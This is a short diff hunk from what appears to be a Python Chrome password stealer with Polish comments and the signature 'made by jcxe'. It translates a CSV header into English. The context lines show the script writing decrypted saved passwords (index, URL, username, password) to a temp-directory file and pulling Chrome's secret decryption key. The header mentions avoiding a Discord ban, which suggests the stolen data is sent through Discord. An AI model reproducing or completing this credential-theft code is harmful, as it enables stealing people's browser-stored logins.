@@ -148,7 +148,7 @@ if __name__ == '__main__':
         csv_file_path = os.path.join(temp_dir, 'odszyfrowane_hasla.csv')
         with open(csv_file_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',', escapechar='\\')
-            csv_writer.writerow(["Indeks", "URL", "Nazwa użytkownika", "Hasło + kilka losowych znaków"])
+            csv_writer.writerow(["Index", "URL", "username", "password + random symbols (to don't get ban on discord)"])
 #𝖒𝖆𝖉𝖊 𝖇𝖞 𝖏𝖈𝖝𝖊
             # Pobierz sekretny klucz z Chrome
             secret_key = get_secret_key()
